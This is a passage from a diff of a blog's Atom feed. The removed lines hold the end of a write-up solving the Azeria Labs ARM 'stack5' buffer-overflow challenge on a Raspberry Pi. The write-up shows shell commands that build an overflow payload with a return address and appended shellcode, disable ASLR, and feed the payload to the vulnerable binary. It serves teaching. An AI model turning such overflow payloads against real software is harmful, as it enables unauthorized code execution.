-of the stack should be:&lt;/p&gt;
-
-&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;object align=&quot;middle&quot; data=&quot;/book-of-gehn/uml/b7f34862962704f7be1d7d121d78099f1c7ac9aa.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;/object&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;addr1&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;sp&lt;/code&gt;. But what value is?&lt;/p&gt;
-
-&lt;p&gt;If we disable ASLR we can peek the value with a debugger: 0xbefffbb8&lt;/p&gt;
-
-&lt;h2 id=&quot;the-attack&quot;&gt;The attack&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb8\xfb\xff\xbe'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
-pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;egg.text &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; exploit
-
-pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; pwned_proof
-
-pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setarch linux32 &lt;span class=&quot;nt&quot;&gt;--addr-no-randomize&lt;/span&gt; /bin/bash
-
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;exploit | ./stack5
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
-0
-
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aslr disabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pwned_proof
-pwn!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The assembly of the egg can be found &lt;a href=&quot;/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;readings&quot;&gt;Readings&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://web.archive.org/web/2020*/http://www.phrack.org/issues/58/10.html#article&quot;&gt;Developing StrongARM/Linux shellcode&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://azeria-labs.com/return-oriented-programming-arm32/&quot;&gt;Introduction to ROP on Arm32&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://azeria-labs.com/writing-arm-shellcode/&quot;&gt;Introduction to Writing ARM Shellcode&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Gehn</name></author><summary type="html">We have the same vulnerability than we have in stack4 but this time we will make our own egg/shellcode.</summary></entry></feed>
+topic to learn.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">It’s time to solve the last challenge of this 7 part serie.</summary></entry></feed>
